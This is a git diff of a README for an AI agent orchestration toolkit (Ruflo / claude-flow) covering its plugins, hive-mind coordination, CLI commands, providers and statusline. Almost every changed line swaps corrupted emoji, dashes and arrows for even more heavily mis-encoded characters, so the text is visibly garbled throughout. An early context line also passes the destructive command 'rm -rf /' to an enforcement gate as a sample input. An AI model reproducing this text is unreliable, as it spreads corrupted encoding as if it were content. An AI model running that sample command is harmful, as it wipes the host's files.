+**7-phase pipeline:** Compile ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Retrieve ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Enforce ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Trust ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Prove ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Defend ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Evolve
 
 | Capability | Description |
 |-----------|-------------|
@@ -1580,15 +1580,15 @@ const result = gates.evaluate({ tool: 'bash', args: { command: 'rm -rf /' } });
 // Audit with proof chain
 const chain = createProofChain({ signingKey: process.env.PROOF_KEY! });
 const envelope = chain.seal(runEvent);
-chain.verify(envelope); // true Ã¢â‚¬â€ tamper-evident
+chain.verify(envelope); // true ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â tamper-evident
 ```
 
 ### Key Modules
 
 | Import Path | Purpose |
 |-------------|---------|
-| `@claude-flow/guidance` | Main entry Ã¢â‚¬â€ GuidanceControlPlane |
-| `@claude-flow/guidance/compiler` | CLAUDE.md Ã¢â€ â€™ PolicyBundle compiler |
+| `@claude-flow/guidance` | Main entry ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â GuidanceControlPlane |
+| `@claude-flow/guidance/compiler` | CLAUDE.md ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ PolicyBundle compiler |
 | `@claude-flow/guidance/retriever` | Intent classification + shard retrieval |
 | `@claude-flow/guidance/gates` | 4 enforcement gates |
 | `@claude-flow/guidance/ledger` | Run event logging + evaluators |
@@ -1621,17 +1621,17 @@ chain.verify(envelope); // true Ã¢â‚¬â€ tamper-evident
 
 ---
 
-## Ã°Å¸â€œÂ¦ Core Features
+## ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¦ Core Features
 
 Comprehensive capabilities for enterprise-grade AI agent orchestration.
 
 <details>
-<summary>Ã°Å¸â€œÂ¦ <strong>Features</strong> Ã¢â‚¬â€ 100+ Agents, Swarm Topologies, MCP Tools & Security</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¦ <strong>Features</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 100+ Agents, Swarm Topologies, MCP Tools & Security</summary>
 
 Comprehensive feature set for enterprise-grade AI agent orchestration.
 
 <details open>
-<summary>Ã°Å¸Â¤â€“ <strong>Agent Ecosystem</strong> Ã¢â‚¬â€ 16 specialized agent roles + custom types across 8 categories</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â¤Ã¢â‚¬â€œ <strong>Agent Ecosystem</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 16 specialized agent roles + custom types across 8 categories</summary>
 
 Pre-built agents for every development task, from coding to security audits.
 
@@ -1649,7 +1649,7 @@ Pre-built agents for every development task, from coding to security audits.
 </details>
 
 <details>
-<summary>Ã°Å¸ÂÂ <strong>Swarm Topologies</strong> Ã¢â‚¬â€ 6 coordination patterns for any workload</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â <strong>Swarm Topologies</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 6 coordination patterns for any workload</summary>
 
 Choose the right topology for your task complexity and team size.
 
@@ -1665,7 +1665,7 @@ Choose the right topology for your task complexity and team size.
 </details>
 
 <details>
-<summary>Ã°Å¸â€˜â€˜ <strong>Hive Mind</strong> Ã¢â‚¬â€ Queen-led collective intelligence with consensus</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ¢â‚¬Ëœ <strong>Hive Mind</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Queen-led collective intelligence with consensus</summary>
 
 The Hive Mind system implements queen-led hierarchical coordination where strategic queen agents direct specialized workers through collective decision-making and shared memory.
 
@@ -1710,7 +1710,7 @@ npx ruflo hive-mind sessions                # List active sessions
 </details>
 
 <details>
-<summary>Ã°Å¸â€˜Â¥ <strong>Agent Teams</strong> Ã¢â‚¬â€ Claude Code multi-instance coordination</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¥ <strong>Agent Teams</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Claude Code multi-instance coordination</summary>
 
 Native integration with Claude Code's experimental Agent Teams feature for spawning and coordinating multiple Claude instances.
 
@@ -1780,7 +1780,7 @@ npx ruflo@latest hooks task-completed --task-id <id> --train-patterns
 </details>
 
 <details>
-<summary>Ã°Å¸â€Â§ <strong>MCP Tools & Integration</strong> Ã¢â‚¬â€ 313 tools across 31 modules</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â§ <strong>MCP Tools & Integration</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 313 tools across 31 modules</summary>
 
 Full MCP server with tools for coordination, monitoring, memory, and GitHub integration.
 
@@ -1797,7 +1797,7 @@ Full MCP server with tools for coordination, monitoring, memory, and GitHub inte
 </details>
 
 <details>
-<summary>Ã°Å¸â€â€™ <strong>Security Features</strong> Ã¢â‚¬â€ CVE-hardened with 7 protection layers</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬â„¢ <strong>Security Features</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â CVE-hardened with 7 protection layers</summary>
 
 Enterprise-grade security with input validation, sandboxing, and active CVE monitoring.
 
@@ -1814,7 +1814,7 @@ Enterprise-grade security with input validation, sandboxing, and active CVE moni
 </details>
 
 <details>
-<summary>Ã¢Å¡Â¡ <strong>Advanced Capabilities</strong> Ã¢â‚¬â€ Self-healing, auto-scaling, event sourcing</summary>
+<summary>ÃƒÂ¢Ã…Â¡Ã‚Â¡ <strong>Advanced Capabilities</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Self-healing, auto-scaling, event sourcing</summary>
 
 Production-ready features for high availability and continuous learning.
 
@@ -1832,7 +1832,7 @@ Production-ready features for high availability and continuous learning.
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Â© <strong>Plugin System</strong> Ã¢â‚¬â€ Extend with custom tools, hooks, workers</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â© <strong>Plugin System</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Extend with custom tools, hooks, workers</summary>
 
 Build custom plugins with the fluent builder API. Create MCP tools, hooks, workers, and providers.
 
@@ -1847,7 +1847,7 @@ Build custom plugins with the fluent builder API. Create MCP tools, hooks, worke
 
 **Plugin Performance:** Load <20ms, Hook execution <0.5ms, Worker spawn <50ms
 
-### Ã°Å¸â€œÂ¦ Available Optional Plugins
+### ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¦ Available Optional Plugins
 
 Install these optional plugins to extend Ruflo capabilities:
 
@@ -1858,7 +1858,7 @@ Install these optional plugins to extend Ruflo capabilities:
 | **@claude-flow/plugin-gastown-bridge** | 0.1.0 | Gas Town orchestrator integration with WASM-accelerated formula parsing (instant (regex-based, no LLM call)), Beads sync, convoy management, and graph analysis. 20 MCP tools. | `npx ruflo@latest plugins install -n @claude-flow/plugin-gastown-bridge` |
 | **@claude-flow/teammate-plugin** | 1.0.0-alpha.1 | Native TeammateTool integration for Claude Code v2.1.19+. BMSSP WASM acceleration, rate limiting, circuit breaker, semantic routing. 21 MCP tools. | `npx ruflo@latest plugins install -n @claude-flow/teammate-plugin` |
 
-#### Ã°Å¸ÂÂ¥ Domain-Specific Plugins
+#### ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â¥ Domain-Specific Plugins
 
 | Plugin | Version | Description | Install Command |
 |--------|---------|-------------|-----------------|
@@ -1866,7 +1866,7 @@ Install these optional plugins to extend Ruflo capabilities:
 | **@claude-flow/plugin-financial-risk** | 0.1.0 | PCI-DSS/SOX compliant financial risk analysis. Portfolio optimization, fraud detection, regulatory compliance, market simulation. | `npm install @claude-flow/plugin-financial-risk` |
 | **@claude-flow/plugin-legal-contracts** | 0.1.0 | Attorney-client privilege protected contract analysis. Risk identification, clause extraction, compliance verification. | `npm install @claude-flow/plugin-legal-contracts` |
 
-#### Ã°Å¸â€™Â» Development Intelligence Plugins
+#### ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â» Development Intelligence Plugins
 
 | Plugin | Version | Description | Install Command |
 |--------|---------|-------------|-----------------|
@@ -1874,14 +1874,14 @@ Install these optional plugins to extend Ruflo capabilities:
 | **@claude-flow/plugin-test-intelligence** | 0.1.0 | AI-powered test generation and optimization. Coverage analysis, mutation testing, test prioritization, flaky test detection. | `npm install @claude-flow/plugin-test-intelligence` |
 | **@claude-flow/plugin-perf-optimizer** | 0.1.0 | Performance profiling and optimization. Memory leak detection, CPU bottleneck analysis, I/O optimization, caching strategies. | `npm install @claude-flow/plugin-perf-optimizer` |
 
-#### Ã°Å¸Â§Â  Advanced AI/Reasoning Plugins
+#### ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  Advanced AI/Reasoning Plugins
 
 | Plugin | Version | Description | Install Command |
 |--------|---------|-------------|-----------------|
 | **@claude-flow/plugin-neural-coordination** | 0.1.0 | Multi-agent neural coordination with SONA learning. Agent specialization, knowledge transfer, collective decision making. | `npm install @claude-flow/plugin-neural-coordination` |
-| **@claude-flow/plugin-cognitive-kernel** | 0.1.0 | Cognitive computing kernel for working memory, attention control, meta-cognition, and task scaffolding. Miller's Law (7Ã‚Â±2) compliance. | `npm install @claude-flow/plugin-cognitive-kernel` |
+| **@claude-flow/plugin-cognitive-kernel** | 0.1.0 | Cognitive computing kernel for working memory, attention control, meta-cognition, and task scaffolding. Miller's Law (7Ãƒâ€šÃ‚Â±2) compliance. | `npm install @claude-flow/plugin-cognitive-kernel` |
 | **@claude-flow/plugin-quantum-optimizer** | 0.1.0 | Quantum-inspired optimization (QAOA, VQE, quantum annealing). Combinatorial optimization, Grover search, tensor networks. | `npm install @claude-flow/plugin-quantum-optimizer` |
-| **@claude-flow/plugin-hyperbolic-reasoning** | 0.1.0 | Hyperbolic geometry for hierarchical reasoning. PoincarÃƒÂ© embeddings, tree-like structure analysis, taxonomic inference. | `npm install @claude-flow/plugin-hyperbolic-reasoning` |
+| **@claude-flow/plugin-hyperbolic-reasoning** | 0.1.0 | Hyperbolic geometry for hierarchical reasoning. PoincarÃƒÆ’Ã‚Â© embeddings, tree-like structure analysis, taxonomic inference. | `npm install @claude-flow/plugin-hyperbolic-reasoning` |
 
 **Agentic-QE Plugin Features:**
 - 58 specialized QE agents across 13 bounded contexts
@@ -1916,7 +1916,7 @@ Install these optional plugins to extend Ruflo capabilities:
 - **Neural Coordination**: 5 tools for multi-agent learning, knowledge transfer, consensus
 - **Cognitive Kernel**: 5 tools for working memory, attention control, meta-cognition
 - **Quantum Optimizer**: 5 tools for QAOA, VQE, quantum annealing, Grover search
-- **Hyperbolic Reasoning**: 5 tools for PoincarÃƒÂ© embeddings, tree inference, taxonomic analysis
+- **Hyperbolic Reasoning**: 5 tools for PoincarÃƒÆ’Ã‚Â© embeddings, tree inference, taxonomic analysis
 
 ```bash
 # Install Quality Engineering plugin
@@ -1951,7 +1951,7 @@ npx ruflo plugins list --installed
 </details>
 
 <details>
-<summary>Ã°Å¸ÂªÂ <strong>Plugin Hook Events</strong> Ã¢â‚¬â€ 25+ lifecycle hooks for full control</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂªÃ‚Â <strong>Plugin Hook Events</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 25+ lifecycle hooks for full control</summary>
 
 Intercept and extend any operation with pre/post hooks.
 
@@ -1969,7 +1969,7 @@ Intercept and extend any operation with pre/post hooks.
 </details>
 
 <details>
-<summary>Ã°Å¸â€Å’ <strong>RuVector WASM Plugins</strong> Ã¢â‚¬â€ High-performance WebAssembly extensions</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ…â€™ <strong>RuVector WASM Plugins</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â High-performance WebAssembly extensions</summary>
 
 Pre-built WASM plugins for semantic search, intent routing, and pattern storage.
 
@@ -1985,7 +1985,7 @@ Pre-built WASM plugins for semantic search, intent routing, and pattern storage.
 </details>
 
 <details>
-<summary>Ã°Å¸ÂËœ <strong>RuVector PostgreSQL Bridge</strong> Ã¢â‚¬â€ Production vector database with AI capabilities</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂÃ‹Å“ <strong>RuVector PostgreSQL Bridge</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Production vector database with AI capabilities</summary>
 
 Full PostgreSQL integration with advanced vector operations, attention mechanisms, GNN layers, and self-learning optimization.
 
@@ -2096,7 +2096,7 @@ await learning.indexTuner.tune('my_index');
 </details>
 
 <details>
-<summary>Ã¢Å¡â„¢Ã¯Â¸Â <strong>Background Workers</strong> Ã¢â‚¬â€ 12 auto-triggered workers for automation</summary>
+<summary>ÃƒÂ¢Ã…Â¡Ã¢â€žÂ¢ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Background Workers</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 12 auto-triggered workers for automation</summary>
 
 Workers run automatically based on context, or dispatch manually via MCP tools.
 
@@ -2121,7 +2121,7 @@ npx ruflo@latest worker status
 </details>
 
 <details>
-<summary>Ã¢ËœÂÃ¯Â¸Â <strong>LLM Providers</strong> Ã¢â‚¬â€ 5 providers (Anthropic, OpenAI, Google, Cohere, Ollama) with automatic failover</summary>
+<summary>ÃƒÂ¢Ã‹Å“Ã‚ÂÃƒÂ¯Ã‚Â¸Ã‚Â <strong>LLM Providers</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 5 providers (Anthropic, OpenAI, Google, Cohere, Ollama) with automatic failover</summary>
 
 | Provider | Models | Features | Cost |
 |----------|--------|----------|------|
@@ -2133,7 +2133,7 @@ npx ruflo@latest worker status
 | **Meta/Ollama** | Llama 3.3, DeepSeek V3, Qwen 2.5 | Local, free, open-weight | Free |
 
 <details>
-<summary>Ã¢Å¡â€“Ã¯Â¸Â <strong>Provider Load Balancing</strong> Ã¢â‚¬â€ 4 strategies for optimal cost and performance</summary>
+<summary>ÃƒÂ¢Ã…Â¡Ã¢â‚¬â€œÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Provider Load Balancing</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 4 strategies for optimal cost and performance</summary>
 
 | Strategy | Description | Best For |
 |----------|-------------|----------|
@@ -2145,7 +2145,7 @@ npx ruflo@latest worker status
 </details>
 
 <details>
-<summary>Ã°Å¸â€Â¢ <strong>Embedding Providers</strong> Ã¢â‚¬â€ 4 providers from 3ms local to cloud APIs</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â¢ <strong>Embedding Providers</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 4 providers from 3ms local to cloud APIs</summary>
 
 | Provider | Models | Dimensions | Latency | Cost |
 |----------|--------|------------|---------|------|
@@ -2157,7 +2157,7 @@ npx ruflo@latest worker status
 | Feature | Description | Performance |
 |---------|-------------|-------------|
 | **Auto-Install** | `provider: 'auto'` installs agentic-flow automatically | Zero config |
-| **Smart Fallback** | agentic-flow Ã¢â€ â€™ transformers Ã¢â€ â€™ mock chain | Always works |
+| **Smart Fallback** | agentic-flow ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ transformers ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ mock chain | Always works |
 | **75x Faster** | Agentic-flow ONNX vs Transformers.js | 3ms vs 230ms |
 | **LRU Caching** | Intelligent cache with hit rate tracking | <1ms cache hits |
 | **Batch Processing** | Efficient batch embedding with partial cache | 10 items <100ms |
@@ -2168,7 +2168,7 @@ npx ruflo@latest worker status
 </details>
 
 <details>
-<summary>Ã°Å¸Â¤Â <strong>Consensus Strategies</strong> Ã¢â‚¬â€ 5 distributed agreement protocols</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â¤Ã‚Â <strong>Consensus Strategies</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 5 distributed agreement protocols</summary>
 
 | Strategy | Algorithm | Fault Tolerance | Latency | Best For |
 |----------|-----------|-----------------|---------|----------|
@@ -2181,7 +2181,7 @@ npx ruflo@latest worker status
 </details>
 
 <details>
-<summary>Ã°Å¸â€™Â» <strong>CLI Commands</strong> Ã¢â‚¬â€ 26 commands with 140+ subcommands</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â» <strong>CLI Commands</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 26 commands with 140+ subcommands</summary>
 
 | Command | Subcommands | Description |
 |---------|-------------|-------------|
@@ -2197,7 +2197,7 @@ npx ruflo@latest worker status
 | `workflow` | 6 | Workflow execution (run, validate, list, status, stop, template) |
 | `hooks` | 32 | Self-learning hooks (pre/post-edit, pre/post-command, route, explain, pretrain, session-*, intelligence/*, worker/*, progress) |
 | `hive-mind` | 6 | Queen-led coordination (init, spawn, status, task, optimize-memory, shutdown) |
-| `migrate` | 5 | V2Ã¢â€ â€™V3 migration (status, run, verify, rollback, breaking) |
+| `migrate` | 5 | V2ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢V3 migration (status, run, verify, rollback, breaking) |
 | `neural` | 5 | Neural pattern training (train, status, patterns, predict, optimize) |
 | `security` | 6 | Security scanning (scan, audit, cve, threats, validate, report) |
 | `performance` | 5 | Performance profiling (benchmark, profile, metrics, optimize, report) |
@@ -2217,7 +2217,7 @@ npx ruflo@latest worker status
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Âª <strong>Testing Framework</strong> Ã¢â‚¬â€ London School TDD with Vitest integration</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Âª <strong>Testing Framework</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â London School TDD with Vitest integration</summary>
 
 | Component | Description | Features |
 |-----------|-------------|----------|
@@ -2238,7 +2238,7 @@ npx ruflo@latest worker status
 </details>
 
 <details>
-<summary>Ã°Å¸Å¡â‚¬ <strong>Deployment & CI/CD</strong> Ã¢â‚¬â€ Automated versioning and release management</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã…Â¡Ã¢â€šÂ¬ <strong>Deployment & CI/CD</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Automated versioning and release management</summary>
 
 | Feature | Description | Automation |
 |---------|-------------|------------|
@@ -2261,7 +2261,7 @@ npx ruflo@latest worker status
 </details>
 
 <details>
-<summary>Ã°Å¸â€â€” <strong>Integration</strong> Ã¢â‚¬â€ agentic-flow bridge with runtime auto-detection</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬â€ <strong>Integration</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â agentic-flow bridge with runtime auto-detection</summary>
 
 | Component | Description | Performance |
 |-----------|-------------|-------------|
@@ -2283,7 +2283,7 @@ npx ruflo@latest worker status
 </details>
 
 <details>
-<summary>Ã°Å¸â€œÅ  <strong>Performance Benchmarking</strong> Ã¢â‚¬â€ Statistical analysis with V3 target validation</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â  <strong>Performance Benchmarking</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Statistical analysis with V3 target validation</summary>
 
 | Capability | Description | Output |
 |------------|-------------|--------|
@@ -2310,7 +2310,7 @@ npx ruflo@latest worker status
 </details>
 
 <details>
-<summary>Ã°Å¸Â§Â  <strong>Neural & SONA</strong> Ã¢â‚¬â€ Self-optimizing learning with 9 RL algorithms</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  <strong>Neural & SONA</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Self-optimizing learning with 9 RL algorithms</summary>
 
 | Feature | Description | Performance |
 |---------|-------------|-------------|
@@ -2334,14 +2334,14 @@ npx ruflo@latest worker status
 </details>
 
 <details>
-<summary>Ã°Å¸â€Â¢ <strong>Embedding System</strong> Ã¢â‚¬â€ Multi-provider ONNX embeddings with hyperbolic space</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â¢ <strong>Embedding System</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Multi-provider ONNX embeddings with hyperbolic space</summary>
 
 | Feature | Description | Performance |
 |---------|-------------|-------------|
 | **Multi-Provider** | Agentic-Flow (ONNX), OpenAI, Transformers.js, Mock | 4 providers |
 | **Auto-Install** | `ruflo embeddings init` or `createEmbeddingServiceAsync()` | Zero config |
 | **75x Faster** | Agentic-flow ONNX SIMD vs Transformers.js | 3ms vs 230ms |
-| **Hyperbolic Space** | PoincarÃƒÂ© ball model for hierarchical data | Exponential capacity |
+| **Hyperbolic Space** | PoincarÃƒÆ’Ã‚Â© ball model for hierarchical data | Exponential capacity |
 | **Dimensions** | 384 to 3072 configurable | Quality vs speed tradeoff |
 | **Similarity Metrics** | Cosine, Euclidean, Dot product, Hyperbolic distance | Task-specific matching |
 | **Neural Substrate** | Drift detection, memory physics, swarm coordination | agentic-flow integration |
@@ -2378,14 +2378,14 @@ ruflo embeddings search -q "authentication patterns"
 </details>
 
 <details>
-<summary>Ã°Å¸ÂËœ <strong>RuVector PostgreSQL Bridge</strong> Ã¢â‚¬â€ Enterprise vector operations with pgvector</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂÃ‹Å“ <strong>RuVector PostgreSQL Bridge</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Enterprise vector operations with pgvector</summary>
 
 | Feature | Description | Performance |
 |---------|-------------|-------------|
 | **pgvector Integration** | Native PostgreSQL vector operations | 150x faster than in-memory |
 | **Attention Mechanisms** | Self, multi-head, cross-attention in SQL | GPU-accelerated |
 | **Graph Neural Networks** | GNN operations via SQL functions | Message passing, aggregation |
-| **Hyperbolic Embeddings** | PoincarÃƒÂ© ball model in PostgreSQL | Better hierarchy representation |
+| **Hyperbolic Embeddings** | PoincarÃƒÆ’Ã‚Â© ball model in PostgreSQL | Better hierarchy representation |
 | **Quantization** | Int8/Float16 compression | 3.92x memory reduction |
 | **Streaming** | Large dataset processing | Batch + async support |
 | **Migrations** | Version-controlled schema | 7 migration scripts |
@@ -2418,12 +2418,12 @@ ruflo ruvector backup --output ./backup.sql
 | `004_create_functions` | Vector functions | Similarity, clustering |
 | `005_create_attention_functions` | Attention ops | Self/multi-head attention |
 | `006_create_gnn_functions` | GNN operations | Message passing, aggregation |
-| `007_create_hyperbolic_functions` | Hyperbolic geometry | PoincarÃƒÂ© operations |
+| `007_create_hyperbolic_functions` | Hyperbolic geometry | PoincarÃƒÆ’Ã‚Â© operations |
 
 </details>
 
 <details>
-<summary>Ã°Å¸â€˜â€˜ <strong>Hive-Mind Coordination</strong> Ã¢â‚¬â€ Queen-led topology with Byzantine consensus</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ¢â‚¬Ëœ <strong>Hive-Mind Coordination</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Queen-led topology with Byzantine consensus</summary>
 
 | Feature | Description | Capability |
 |---------|-------------|------------|
@@ -2446,14 +2446,14 @@ npx ruflo hive-mind spawn "Research AI" --consensus byzantine --claude
 npx ruflo hive-mind status                                  # Check status
 ```
 
-**Ruflo Skill:** `/hive-mind-advanced` Ã¢â‚¬â€ Full hive mind orchestration
+**Ruflo Skill:** `/hive-mind-advanced` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Full hive mind orchestration
 
 **Performance:** Fast batch spawning with token reduction via intelligent routing
 
 </details>
 
 <details>
-<summary>Ã°Å¸â€Å’ <strong>agentic-flow Integration</strong> Ã¢â‚¬â€ ADR-001 compliant core foundation</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ…â€™ <strong>agentic-flow Integration</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â ADR-001 compliant core foundation</summary>
 
 | Feature | Description | Benefit |
 |---------|-------------|---------|
@@ -2469,7 +2469,7 @@ npx ruflo hive-mind status                                  # Check status
 </details>
 
 <details>
-<summary>Ã°Å¸â€“Â¥Ã¯Â¸Â <strong>MCP Server</strong> Ã¢â‚¬â€ Full MCP 2025-11-25 spec with multiple transports</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬â€œÃ‚Â¥ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>MCP Server</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Full MCP 2025-11-25 spec with multiple transports</summary>
 
 | Feature | Description | Spec |
 |---------|-------------|------|
@@ -2499,7 +2499,7 @@ npx ruflo hive-mind status                                  # Check status
 </details>
 
 <details>
-<summary>Ã°Å¸â€Â <strong>Security Module</strong> Ã¢â‚¬â€ CVE-hardened with AIDefence threat detection</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â <strong>Security Module</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â CVE-hardened with AIDefence threat detection</summary>
 
 | Feature | CVE/Issue | Description |
 |---------|-----------|-------------|
@@ -2527,7 +2527,7 @@ npx ruflo hive-mind status                                  # Check status
 </details>
 
 <details>
-<summary>Ã°Å¸ÂªÂ <strong>Hooks System</strong> Ã¢â‚¬â€ Pattern learning with ReasoningBank and HNSW indexing</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂªÃ‚Â <strong>Hooks System</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Pattern learning with ReasoningBank and HNSW indexing</summary>
 
 | Component | Description | Performance |
 |-----------|-------------|-------------|
@@ -2552,7 +2552,7 @@ npx ruflo hive-mind status                                  # Check status
 </details>
 
 <details>
-<summary>Ã°Å¸â€œÅ  <strong>V3 Statusline</strong> Ã¢â‚¬â€ Real-time development status for Claude Code</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â  <strong>V3 Statusline</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Real-time development status for Claude Code</summary>
 
 Real-time development status display integrated directly into Claude Code's status bar. Shows DDD progress, swarm activity, security status, AgentDB metrics, and live session data (model, context usage, cost).
 
@@ -2562,27 +2562,27 @@ Claude Code pipes JSON session data via **stdin** to the statusline script after
 
 **Output Format:**
 ```
-Ã¢â€“Å  Ruflo V3 Ã¢â€”Â ruvnet  Ã¢â€â€š  Ã¢Å½â€¡ main  Ã¢â€â€š  Opus 4.6  | Ã¢â€”Â42% ctx  | $0.15
-Ã°Å¸Ââ€”Ã¯Â¸Â DDD [Ã¢â€”ÂÃ¢â€”ÂÃ¢â€”ÂÃ¢â€”ÂÃ¢â€”â€¹] 4/5  Ã¢Å¡Â¡ HNSW 150x  Ã°Å¸Â¤â€“ Ã¢â€”â€° [12/8]  Ã°Å¸â€˜Â¥ 3  Ã°Å¸Å¸Â¢ CVE 3/3  Ã°Å¸â€™Â¾ 512MB  Ã°Å¸Â§Â  15%  Ã°Å¸â€œÂ¦ AgentDB Ã¢â€”Â1.2K vectors
+ÃƒÂ¢Ã¢â‚¬â€œÃ…Â  Ruflo V3 ÃƒÂ¢Ã¢â‚¬â€Ã‚Â ruvnet  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã…Â½Ã¢â‚¬Â¡ main  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Opus 4.6  | ÃƒÂ¢Ã¢â‚¬â€Ã‚Â42% ctx  | $0.15
+ÃƒÂ°Ã…Â¸Ã‚ÂÃ¢â‚¬â€ÃƒÂ¯Ã‚Â¸Ã‚Â DDD [ÃƒÂ¢Ã¢â‚¬â€Ã‚ÂÃƒÂ¢Ã¢â‚¬â€Ã‚ÂÃƒÂ¢Ã¢â‚¬â€Ã‚ÂÃƒÂ¢Ã¢â‚¬â€Ã‚ÂÃƒÂ¢Ã¢â‚¬â€Ã¢â‚¬Â¹] 4/5  ÃƒÂ¢Ã…Â¡Ã‚Â¡ HNSW 150x  ÃƒÂ°Ã…Â¸Ã‚Â¤Ã¢â‚¬â€œ ÃƒÂ¢Ã¢â‚¬â€Ã¢â‚¬Â° [12/8]  ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¥ 3  ÃƒÂ°Ã…Â¸Ã…Â¸Ã‚Â¢ CVE 3/3  ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â¾ 512MB  ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  15%  ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¦ AgentDB ÃƒÂ¢Ã¢â‚¬â€Ã‚Â1.2K vectors
 ```
 
 | Indicator | Description | Source |
 |-----------|-------------|--------|
-| `Ã¢â€“Å  Ruflo V3` | Project header | Always shown |
-| `Ã¢â€”Â ruvnet` | GitHub user | `gh api user` CLI |
-| `Ã¢Å½â€¡ main` | Current git branch | `git branch --show-current` |
